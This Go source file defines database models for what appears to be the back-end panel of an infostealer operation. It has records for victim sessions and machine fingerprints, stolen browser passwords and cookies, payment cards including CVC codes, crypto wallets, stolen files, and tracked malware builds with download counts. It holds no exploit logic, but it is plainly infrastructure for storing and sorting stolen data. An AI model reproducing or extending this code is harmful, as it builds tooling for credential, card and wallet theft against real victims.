package db

type User struct {
	ID           string `json:"id"`
	Username     string `json:"username"`
	PasswordHash string `json:"-"`
	Role         string `json:"role"`
	CreatedAt    string `json:"created_at"`
}

type Session struct {
	ID          string `json:"id"`
	BuildID     string `json:"build_id,omitempty"`
	Hwid        string `json:"hwid,omitempty"`
	Os          string `json:"os,omitempty"`
	Username    string `json:"username,omitempty"`
	Ip          string `json:"ip,omitempty"`
	CountryCode string `json:"country_code,omitempty"`
	CreatedAt   string `json:"created_at"`
}

type Password struct {
	ID            string `json:"id"`
	SessionID     string `json:"session_id"`
	Url           string `json:"url,omitempty"`
	Username      string `json:"username,omitempty"`
	PasswordValue string `json:"password_value,omitempty"`
	Browser       string `json:"browser,omitempty"`
}

type Cookie struct {
	ID        string `json:"id"`
	SessionID string `json:"session_id"`
	Domain    string `json:"domain,omitempty"`
	Name      string `json:"name,omitempty"`
	Value     string `json:"value,omitempty"`
	Path      string `json:"path,omitempty"`
}

type Card struct {
	ID        string `json:"id"`
	SessionID string `json:"session_id"`
	Number    string `json:"number,omitempty"`
	ExpMonth  string `json:"exp_month,omitempty"`
	ExpYear   string `json:"exp_year,omitempty"`
	Holder    string `json:"holder,omitempty"`
	Cvc       string `json:"cvc,omitempty"`
}

type Wallet struct {
	ID        string `json:"id"`
	SessionID string `json:"session_id"`
	Name      string `json:"name,omitempty"`
	Path      string `json:"path,omitempty"`
}

type WalletResponse struct {
	ID   string `json:"id"`
	Name string `json:"name"`
	Icon string `json:"icon,omitempty"`
	Path string `json:"path,omitempty"`
}

type DomainDetect struct {
	ID        string `json:"id"`
	Domain    string `json:"domain"`
	Tag       string `json:"tag"`
	Color     string `json:"color"`
	CreatedAt string `json:"created_at"`
}

type SessionTag struct {
	ID        string `json:"id"`
	SessionID string `json:"session_id"`
	Tag       string `json:"tag"`
	Color     string `json:"color"`
	CreatedAt string `json:"created_at"`
}

type StolenFile struct {
	ID        string `json:"id"`
	SessionID string `json:"session_id"`
	Filename  string `json:"filename,omitempty"`
	Size      int64  `json:"size"`
}

type SystemInfo struct {
	SessionID string `json:"session_id"`
	Cpu       string `json:"cpu,omitempty"`
	Gpu       string `json:"gpu,omitempty"`
	Ram       string `json:"ram,omitempty"`
	Os        string `json:"os,omitempty"`
	Screen    string `json:"screen,omitempty"`
	Hostname  string `json:"hostname,omitempty"`
	LocalIp   string `json:"local_ip,omitempty"`
	Mac       string `json:"mac,omitempty"`
	PublicIP  string `json:"public_ip,omitempty"`
	Hwid      string `json:"hwid,omitempty"`
	Uptime    string `json:"uptime,omitempty"`
}

type Ban struct {
	ID       string `json:"id"`
	Ip       string `json:"ip"`
	Reason   string `json:"reason,omitempty"`
	BannedAt string `json:"banned_at"`
}

type Setting struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

type Build struct {
	ID            string `json:"id"`
	ConfigHash    string `json:"config_hash,omitempty"`
	FileSize      int64  `json:"file_size"`
	Sha256        string `json:"sha256,omitempty"`
	BuildTag      string `json:"build_tag,omitempty"`
	DownloadCount int    `json:"download_count"`
	CreatedAt     string `json:"created_at"`
}
